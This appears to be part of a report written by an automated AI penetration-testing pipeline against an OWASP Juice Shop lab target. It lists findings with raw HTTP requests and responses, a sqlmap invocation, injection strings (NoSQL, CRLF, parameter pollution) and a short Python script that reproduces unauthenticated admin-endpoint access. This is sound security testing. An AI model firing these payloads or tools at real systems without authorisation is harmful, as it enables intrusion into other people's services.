### W-035 — Parameter Pollution — duplicated query parameter injection (POST /socket.io/)

- **Asset:** `/socket.io/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: DISPROVEN — Duplicated query parameters on /socket.io/ endpoint resulted in consistent 400 errors, indicating the server does not misbehave or process them in an unexpected way that would suggest parameter pollution vulnerabilities.)
- **ATT&CK:** T1071.001
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/socket.io/?EIO=4&transport=polling&t=Q1ejm80&sid=J63gjOh-qhCx3UQqAAAv&sid=J63gjOh-qhCx3UQqAAAv", "method": "POST", "headers": {"accept": "*/*", "origin": "http://juice-shop:3000", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36", "content-type": "text/plain;charset=UTF-8"}, "body": 40}

{"url": "http://juice-shop:3000/socket.io/?EIO=4&transport=polling&t=Q1ejm80&sid=J63gjOh-qhCx3UQqAAAv&sid=J63gjOh-qhCx3UQqAAAv", "status_code": 400, "headers": {"access-control-allow-origin": "http://localhost:4200", "vary": "Origin", "content-type": "application/json", "date": "Thu, 03 Sep 2026 19:28:10 GMT", "connection": "keep-alive", "keep-alive": "timeout=5", "transfer-encoding": "chunked"}, "body": "{\"code\":1,\"message\":\"Session ID unknown\"}", "truncated": false, "redirect_to": null}
```
*VERDICT: DISPROVEN — Duplicated query parameters on /socket.io/ endpoint resulted in consistent 400 errors, indicating the server does not misbehave or process them in an unexpected way that would sug*

### W-036 — Timing Attack on Session ID — query parameter `sid` (POST /socket.io/)

- **Asset:** `/socket.io/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: INCONCLUSIVE — The session ID in the `sid` parameter appears to be validated server-side, as modifying or reusing it results in a "Session ID unknown" error, but this does not confirm or rule out susceptibility to timing-based attacks.)
- **ATT&CK:** T1110
- **Remediation effort:** medium

```http
http_request {}

{"content": ["Error executing tool http_request: 1 validation error for http_requestArguments\nurl\n  Field required [type=missing, input_value={}, input_type=dict]\n    For further information visit https://errors.pydantic.dev/2.13/v/missing"]}
```
*VERDICT: INCONCLUSIVE — The session ID in the `sid` parameter appears to be validated server-side, as modifying or reusing it results in a "Session ID unknown" error, but this does not confirm or rule*

### W-037 — NoSQL Injection — email parameter (POST /rest/user/login)

- **Asset:** `/rest/user/login`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: INCONCLUSIVE — Neither the email nor password field showed signs of NoSQL injection vulnerability as both attempts resulted in 401 Unauthorized.)
- **ATT&CK:** T1190
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/rest/user/login", "method": "POST", "headers": {"accept": "application/json, text/plain, */*", "cookie": "language=en; welcomebanner_status=dismiss", "origin": "http://juice-shop:3000", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36", "content-type": "application/json"}, "body": {"email": "test@example.com", "password": "Test1234!'||'1'=='1"}}

{"url": "http://juice-shop:3000/rest/user/login", "status_code": 401, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "text/html; charset=utf-8", "content-length": "26", "etag": "W/\"1a-ARJvVK+smzAF3QQve2mDSG+3Eus\"", "vary": "Accept-Encoding", "date": "Thu, 03 Sep 2026 19:28:18 GMT", "connection": "keep-alive", "keep-alive": "timeout=5"}, "body": "Invalid email or password.", "truncated": false, "redirect_to": null}
```
*VERDICT: INCONCLUSIVE — Neither the email nor password field showed signs of NoSQL injection vulnerability as both attempts resulted in 401 Unauthorized.*

### W-038 — Account Takeover via Unicode Normalization — email parameter (POST /rest/user/login)

- **Asset:** `/rest/user/login`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: INCONCLUSIVE — The initial login attempt failed with invalid credentials, but there is no evidence yet of vulnerability or mitigation regarding Unicode normalization on the email parameter.)
- **ATT&CK:** T1078, T1078, T1078, T1078
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/rest/user/login", "method": "POST", "headers": {"accept": "application/json, text/plain, */*", "cookie": "language=en; welcomebanner_status=dismiss", "origin": "http://juice-shop:3000", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36", "content-type": "application/json"}, "body": {"email": "test@example.com", "password": "Test1234!"}}

{"url": "http://juice-shop:3000/rest/user/login", "status_code": 401, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "text/html; charset=utf-8", "content-length": "26", "etag": "W/\"1a-ARJvVK+smzAF3QQve2mDSG+3Eus\"", "vary": "Accept-Encoding", "date": "Thu, 03 Sep 2026 19:28:21 GMT", "connection": "keep-alive", "keep-alive": "timeout=5"}, "body": "Invalid email or password.", "truncated": false, "redirect_to": null}
```
*VERDICT: INCONCLUSIVE — The initial login attempt failed with invalid credentials, but there is no evidence yet of vulnerability or mitigation regarding Unicode normalization on the email parameter.*

### W-039 — JSON/XML/YAML Parsing Vulnerability — request body (POST /rest/user/login)

- **Asset:** `/rest/user/login`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: INCONCLUSIVE — No relevant HackTricks articles matched the suspected JSON parsing vulnerability, and no payloads were generated to test the endpoint for such vulnerabilities.)
- **ATT&CK:** T1203
- **Remediation effort:** medium

```http
hacktricks_article {"slug": "xxe-xml-external-entity"}

{"slug": "xxe-xml-external-entity", "found": false, "did_you_mean": ["xxe-xee-xml-external-entity", "browser-extension-pentesting-methodology", "email-injections", "json-xml-yaml-hacking", "phone-number-injections", "web-api-pentesting", "parameter-pollution", "regular-expression-denial-of-service-redos"], "guidance": "No article by that slug. Do NOT invent one. Pick the closest match from did_you_mean (or from hacktricks_overview) and call hacktricks_article again. If nothing fits, write your hypothesis from first principles without an example."}
```
*VERDICT: INCONCLUSIVE — No relevant HackTricks articles matched the suspected JSON parsing vulnerability, and no payloads were generated to test the endpoint for such vulnerabilities.*

### W-040 — Authentication Bypass — email/password parameters (POST /rest/user/login)

- **Asset:** `/rest/user/login`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (INCONCLUSIVE — hit the step limit without a verdict)
- **ATT&CK:** T1078, T1078, T1078, T1078
- **Remediation effort:** medium

```http
sqlmap {"url": "http://juice-shop:3000/rest/user/login", "method": "POST", "data": {"email": "test@example.com", "password": "Test1234!"}, "headers": {"accept": "application/json, text/plain, */*", "cookie": "language=en; welcomebanner_status=dismiss", "origin": "http://juice-shop:3000", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36", "content-type": "application/json"}, "param": "email", "level": 1, "risk": 1, "extra_flags": ["--ignore-code=401"]}

{"command": "python3 /opt/sqlmap/sqlmap.py -u http://juice-shop:3000/rest/user/login --batch --disable-coloring --output-dir /tmp/sqlmap-out --level 1 --risk 1 --method POST --data {\"email\": \"test@example.com\", \"password\": \"Test1234!\"} -H accept: application/json, text/plain, */* -H cookie: language=en; welcomebanner_status=dismiss -H origin: http://juice-shop:3000 -H referer: http://juice-shop:3000/ -H user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36 -H content-type: application/json -p email --ignore-code=40
```
*INCONCLUSIVE — hit the step limit without a verdict*

### W-041 — Password Enumeration via Response Timing — password parameter (POST /rest/user/login)

- **Asset:** `/rest/user/login`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: INCONCLUSIVE — No relevant HackTricks article found to confirm or deny password enumeration via response timing on the given endpoint.)
- **ATT&CK:** T1110
- **Remediation effort:** medium

```http
hacktricks_article {"slug": " brute-force-and-password-spraying"}

{"slug": "brute-force-and-password-spraying", "found": false, "did_you_mean": ["reset-password", "iis-internet-information-services", "bypass-payment-process", "rate-limit-bypass", "put-method-webdav", "web-api-pentesting", "xss-cross-site-scripting", "reverse-tab-nabbing"], "guidance": "No article by that slug. Do NOT invent one. Pick the closest match from did_you_mean (or from hacktricks_overview) and call hacktricks_article again. If nothing fits, write your hypothesis from first principles without an example."}
```
*VERDICT: INCONCLUSIVE — No relevant HackTricks article found to confirm or deny password enumeration via response timing on the given endpoint.*

### W-043 — LDAP Injection — email parameter (POST /rest/user/login)

- **Asset:** `/rest/user/login`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: INCONCLUSIVE — The LDAP payloads did not produce a different response compared to normal input, but the baseline request also failed, suggesting the vulnerability is likely not exploitable or does not exist.)
- **ATT&CK:** T1190
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/rest/user/login", "method": "POST", "headers": {"accept": "application/json, text/plain, */*", "cookie": "language=en; welcomebanner_status=dismiss", "origin": "http://juice-shop:3000", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36", "content-type": "application/json"}, "body": {"email": "test@example.com", "password": "Test1234!"}}

{"url": "http://juice-shop:3000/rest/user/login", "status_code": 401, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "text/html; charset=utf-8", "content-length": "26", "etag": "W/\"1a-ARJvVK+smzAF3QQve2mDSG+3Eus\"", "vary": "Accept-Encoding", "date": "Thu, 03 Sep 2026 19:29:15 GMT", "connection": "keep-alive", "keep-alive": "timeout=5"}, "body": "Invalid email or password.", "truncated": false, "redirect_to": null}
```
*VERDICT: INCONCLUSIVE — The LDAP payloads did not produce a different response compared to normal input, but the baseline request also failed, suggesting the vulnerability is likely not exploitable or*

### W-044 — Brute Force/Race Condition — email/password parameters (POST /rest/user/login)

- **Asset:** `/rest/user/login`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: INCONCLUSIVE — The HackTricks article on race conditions provides general examples, but does not confirm whether the specific email/password parameters in POST /rest/user/login are vulnerable to brute force or race condition attacks. Without concrete evidence from targeted tests, a definitive conclusion cannot be drawn.)
- **ATT&CK:** T1110
- **Remediation effort:** medium

```http
hacktricks_article {"slug": "race-condition"}

{"slug": "race-condition", "found": true, "title": "Race Condition", "content": "# Race Condition\n\n> [!WARNING]\n> For obtaining a deep understanding of this technique check the original report in [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)<sup>[[1]](#references)</sup>\n\n## Enhancing Race Condition Attacks\n\nThe main hurdle in exploiting race conditions is ensuring that multiple requests reach the vulnerable state transition together, with **very little difference in processing time\u2014ideally less than 1 ms**
```
*VERDICT: INCONCLUSIVE — The HackTricks article on race conditions provides general examples, but does not confirm whether the specific email/password parameters in POST /rest/user/login are vulnerable*

### W-045 — IDOR — Direct object access (GET /api/Feedbacks/)

- **Asset:** `/api/Feedbacks/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: INCONCLUSIVE — The endpoint `/api/Feedbacks/` returns feedback data accessible to all users without clear authorization checks, which aligns with potential IDOR vulnerability, but further testing with authenticated sessions and specific object identifiers is needed to confirm direct object reference abuse.)
- **ATT&CK:** T1068
- **Remediation effort:** medium

```http
hacktricks_article {"slug": "idor"}

{"slug": "idor", "found": true, "title": "IDOR", "content": "# IDOR (Insecure Direct Object Reference)\n\nIDOR (Insecure Direct Object Reference) / Broken Object Level Authorization (BOLA) appears when a web or API endpoint discloses or accepts a user\u2013controllable identifier that is used **directly** to access an internal object **without verifying that the caller is authorized** to access/modify that object.  \nSuccessful exploitation normally allows horizontal or vertical privilege-escalation such as reading or modifying other users\u2019 data and, in the worst case, full account takeov
```
*VERDICT: INCONCLUSIVE — The endpoint `/api/Feedbacks/` returns feedback data accessible to all users without clear authorization checks, which aligns with potential IDOR vulnerability, but further tes*

### W-046 — SSRF — Internal service probing via Feedback submission (GET /api/Feedbacks/)

- **Asset:** `/api/Feedbacks/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: INCONCLUSIVE — The SSRF vulnerability via Feedback submission could not be confirmed due to lack of exploitable parameters in the GET request to /api/Feedbacks/. No internal service probing was achievable.)
- **ATT&CK:** T1190
- **Remediation effort:** medium

```http
crawl {"url": "http://juice-shop:3000"}

{"seed": "http://juice-shop:3000", "pages": [{"url": "http://juice-shop:3000/#/", "status": 200, "content_type": "text/html", "server": "", "powered_by": ""}, {"url": "http://juice-shop:3000/#/login", "status": 200, "content_type": "text/html", "server": "", "powered_by": ""}, {"url": "http://juice-shop:3000/#/contact", "status": 200, "content_type": "text/html", "server": "", "powered_by": ""}, {"url": "http://juice-shop:3000/#/about", "status": 200, "content_type": "text/html", "server": "", "powered_by": ""}, {"url": "http://juice-shop:3000/#/photo-wall", "status": 200, "content_type": "tex
```
*VERDICT: INCONCLUSIVE — The SSRF vulnerability via Feedback submission could not be confirmed due to lack of exploitable parameters in the GET request to /api/Feedbacks/. No internal service probing w*

### W-047 — XSS — Reflected or stored injection through feedback content (GET /api/Feedbacks/)

- **Asset:** `/api/Feedbacks/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: INCONCLUSIVE — The response does not reflect any user-controllable input back in a way that would clearly indicate stored or reflected XSS, but further testing with payloads is needed.)
- **ATT&CK:** T1189
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/api/Feedbacks/", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "cookie": "language=en; welcomebanner_status=dismiss", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

{"url": "http://juice-shop:3000/api/Feedbacks/", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "etag": "W/\"6c6-pvsaPUMRZ/J9AfqBWDwd7zfGTkQ\"", "vary": "Accept-Encoding", "content-encoding": "gzip", "date": "Thu, 03 Sep 2026 19:31:47 GMT", "connection": "keep-alive", "keep-alive": "timeout=5", "transfer-encoding": "chunked"}, "body": "{\"status\":\"success\",\"data\":[{\"UserId\":1,\"id\":1,
```
*VERDICT: INCONCLUSIVE — The response does not reflect any user-controllable input back in a way that would clearly indicate stored or reflected XSS, but further testing with payloads is needed.*

### W-048 — CSRF — Unauthorized feedback actions via forged requests (GET /api/Feedbacks/)

- **Asset:** `/api/Feedbacks/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: INCONCLUSIVE — No CSRF-related technique was tested because required parameters for hacktricks_article were missing, preventing confirmation or rejection of the vulnerability.)
- **ATT&CK:** T1071.001
- **Remediation effort:** medium

```http
hacktricks_article {}

{"content": ["Error executing tool hacktricks_article: 1 validation error for hacktricks_articleArguments\nslug\n  Field required [type=missing, input_value={}, input_type=dict]\n    For further information visit https://errors.pydantic.dev/2.13/v/missing"]}
```
*VERDICT: INCONCLUSIVE — No CSRF-related technique was tested because required parameters for hacktricks_article were missing, preventing confirmation or rejection of the vulnerability.*

### W-049 — CRLF Injection — Header manipulation via malformed input (GET /api/Feedbacks/)

- **Asset:** `/api/Feedbacks/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: DISPROVEN - The CRLF injection attempt by appending %0d%0aSet-Cookie:test=test to the URL resulted in a 401 Unauthorized error, not a successful injection of the header. There is no evidence the application processed the CRLF sequence to manipulate headers.)
- **ATT&CK:** T1071.001
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/api/Feedbacks/%0d%0aSet-Cookie:test=test", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "cookie": "language=en; welcomebanner_status=dismiss", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

{"url": "http://juice-shop:3000/api/Feedbacks/%0d%0aSet-Cookie:test=test", "status_code": 401, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "vary": "Accept-Encoding", "date": "Thu, 03 Sep 2026 19:31:53 GMT", "connection": "keep-alive", "keep-alive": "timeout=5", "transfer-encoding": "chunked"}, "body": "{\n  \"error\": {\n    \"message\": \"No Authorization header was found\",\n    \"name\": \"UnauthorizedErro
```
*VERDICT: DISPROVEN - The CRLF injection attempt by appending %0d%0aSet-Cookie:test=test to the URL resulted in a 401 Unauthorized error, not a successful injection of the header. There is no evidence *

### W-050 — Cache Poisoning — Response caching of user-specific feedback data (GET /api/Feedbacks/)

- **Asset:** `/api/Feedbacks/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: INCONCLUSIVE — The responses from the two requests were identical, suggesting that cookies might not influence caching behavior for this endpoint. However, without explicit cache header inspection or more variations tested, we cannot confirm cache poisoning.)
- **ATT&CK:** T1071.001
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/api/Feedbacks/", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

{"url": "http://juice-shop:3000/api/Feedbacks/", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "etag": "W/\"6c6-pvsaPUMRZ/J9AfqBWDwd7zfGTkQ\"", "vary": "Accept-Encoding", "content-encoding": "gzip", "date": "Thu, 03 Sep 2026 19:31:57 GMT", "connection": "keep-alive", "keep-alive": "timeout=5", "transfer-encoding": "chunked"}, "body": "{\"status\":\"success\",\"data\":[{\"UserId\":1,\"id\":1,
```
*VERDICT: INCONCLUSIVE — The responses from the two requests were identical, suggesting that cookies might not influence caching behavior for this endpoint. However, without explicit cache header inspe*

### W-052 — SSRF — backend service interaction (GET /rest/memories/)

- **Asset:** `/rest/memories/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (INCONCLUSIVE — hit the step limit without a verdict)
- **ATT&CK:** T1190
- **Remediation effort:** medium

```http
hacktricks_article {"slug": "ssrf"}

{"slug": "ssrf", "found": false, "did_you_mean": ["xs-search", "grafana", "sitecore", "reset-password", "wordpress"], "guidance": "No article by that slug. Do NOT invent one. Pick the closest match from did_you_mean (or from hacktricks_overview) and call hacktricks_article again. If nothing fits, write your hypothesis from first principles without an example."}
```
*INCONCLUSIVE — hit the step limit without a verdict*

### W-053 — Race Condition — state inconsistency during memory retrieval (GET /rest/memories/)

- **Asset:** `/rest/memories/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (...

...

...

VERDICT: INCONCLUSIVE — The retrieved memory data does not indicate any obvious state inconsistency or race condition; further analysis or concurrent testing would be needed to confirm the vulnerability.)
- **ATT&CK:** T1190
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/rest/memories/", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "cookie": "language=en; welcomebanner_status=dismiss", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

{"url": "http://juice-shop:3000/rest/memories/", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "etag": "W/\"1822-DlNhbpQQVLmEKoPAEtCMpT4BO1I\"", "vary": "Accept-Encoding", "content-encoding": "gzip", "date": "Thu, 03 Sep 2026 19:34:21 GMT", "connection": "keep-alive", "keep-alive": "timeout=5", "transfer-encoding": "chunked"}, "body": "{\"status\":\"success\",\"data\":[{\"UserId\":13,\"id\":
```
*...

...

...

VERDICT: INCONCLUSIVE — The retrieved memory data does not indicate any obvious state inconsistency or race condition; further analysis or concurrent testing would be needed to confirm *

### W-054 — Cache Deception — tricking cache to expose private memories (GET /rest/memories/)

- **Asset:** `/rest/memories/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: DISPROVEN — The server returns a 500 error for the deceptive path `/rest/memories/index.html`, indicating it does not improperly cache responses for this endpoint.)
- **ATT&CK:** T1071.001
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/rest/memories/index.html", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "cookie": "language=en; welcomebanner_status=dismiss", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

{"url": "http://juice-shop:3000/rest/memories/index.html", "status_code": 500, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "vary": "Accept-Encoding", "content-encoding": "gzip", "date": "Thu, 03 Sep 2026 19:34:27 GMT", "connection": "keep-alive", "keep-alive": "timeout=5", "transfer-encoding": "chunked"}, "body": "{\n  \"error\": {\n    \"message\": \"Unexpected path: /rest/memories/index.html\",\n    \"stack
```
*VERDICT: DISPROVEN — The server returns a 500 error for the deceptive path `/rest/memories/index.html`, indicating it does not improperly cache responses for this endpoint.*

### W-055 — CSRF — force victim to retrieve attacker-chosen memories (GET /rest/memories/)

- **Asset:** `/rest/memories/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: INCONCLUSIVE — The GET request to /rest/memories/ retrieves data successfully but there is no evidence of CSRF vulnerability without further exploitation attempts.)
- **ATT&CK:** T1071.001
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/rest/memories/", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "cookie": "language=en; welcomebanner_status=dismiss", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

{"url": "http://juice-shop:3000/rest/memories/", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "etag": "W/\"1822-DlNhbpQQVLmEKoPAEtCMpT4BO1I\"", "vary": "Accept-Encoding", "content-encoding": "gzip", "date": "Thu, 03 Sep 2026 19:34:31 GMT", "connection": "keep-alive", "keep-alive": "timeout=5", "transfer-encoding": "chunked"}, "body": "{\"status\":\"success\",\"data\":[{\"UserId\":13,\"id\":
```
*VERDICT: INCONCLUSIVE — The GET request to /rest/memories/ retrieves data successfully but there is no evidence of CSRF vulnerability without further exploitation attempts.*

### W-056 — Parameter Pollution — influencing memory query via polluted params (GET /rest/memories/)

- **Asset:** `/rest/memories/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: INCONCLUSIVE — The response does not indicate any SQL errors or unusual behaviors that would confirm SQL injection, nor does it demonstrate clear evidence of parameter pollution effects. Further targeted testing is required to confirm or rule out the vulnerability.)
- **ATT&CK:** T1071.001
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/rest/memories/", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "cookie": "language=en; welcomebanner_status=dismiss", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

{"url": "http://juice-shop:3000/rest/memories/", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "etag": "W/\"1822-DlNhbpQQVLmEKoPAEtCMpT4BO1I\"", "vary": "Accept-Encoding", "content-encoding": "gzip", "date": "Thu, 03 Sep 2026 19:34:34 GMT", "connection": "keep-alive", "keep-alive": "timeout=5", "transfer-encoding": "chunked"}, "body": "{\"status\":\"success\",\"data\":[{\"UserId\":13,\"id\":
```
*VERDICT: INCONCLUSIVE — The response does not indicate any SQL errors or unusual behaviors that would confirm SQL injection, nor does it demonstrate clear evidence of parameter pollution effects. Furt*

## Attack playbook

Reproduction scripts for confirmed findings only. Each has passed a static safety check and performs no destructive action.

### W-001 — reproduction

Attempts direct unauthenticated access to the admin configuration endpoint to confirm IDOR vulnerability.

```python
import requests
import sys

target = sys.argv[1]
url = f"{target}/rest/admin/application-configuration"

response = requests.get(url)
if response.status_code == 200 and 'application' in response.text:
    print('W-001 REPRODUCED: Direct access to admin config succeeded')
    print('Response snippet:', response.text[:200])
else:
    print('W-001 NOT REPRODUCED: Admin config access failed or invalid response')
```

**Fix.** Implement proper authentication and authorization checks for all admin endpoints.

## ATT&CK coverage

| Technique | Findings |
|---|---|
| `T1005` | W-005 |
| `T1059` | W-027 |
| `T1068` | W-001, W-010, W-045, W-051 |
| `T1071.001` | W-002, W-007, W-008, W-009, W-018, W-019, W-021, W-028, W-029, W-032, W-034, W-035, W-048, W-049, W-050, W-054, W-055, W-056 |
| `T1078` | W-004, W-004, W-004, W-004, W-006, W-006, W-006, W-006, W-014, W-014, W-014, W-014, W-033, W-033, W-033, W-033, W-038, W-038, W-038, W-038, W-040, W-040, W-040, W-040 |
| `T1082` | W-012 |
| `T1083` | W-013 |
| `T1110` | W-036, W-041, W-044 |
| `T1189` | W-015, W-023, W-047 |
| `T1190` | W-003, W-011, W-016, W-020, W-022, W-026, W-030, W-037, W-042, W-043, W-046, W-052, W-053 |
| `T1203` | W-039 |
| `T1212` | W-013 |
| `T1498` | W-024, W-031 |
| `T1529` | W-012 |
| `T1530` | W-005 |
| `T1566.002` | W-017, W-025 |

## Caveats and limitations

These bound how far the results above can be relied on.

- Produced by an autonomous pipeline with no human review. Findings should be validated by a security engineer before remediation is prioritised or the results are shared externally.
- The crawl hit a configured limit after 5 pages, so the asset map is a lower bound and parts of the application were never seen.
- API routes were extracted from client-side JavaScript. They are candidate routes the application references, not a verified inventory of its endpoints.
- 48 of 56 findings were not proven exploitable (W-002, W-003, W-006, W-007, W-009, W-010, W-011, W-013, …). They are hypotheses based on observed assets, not demonstrated vulnerabilities.
- Absence of a finding is not evidence of absence. This engagement covered what the crawler reached within its configured bounds.
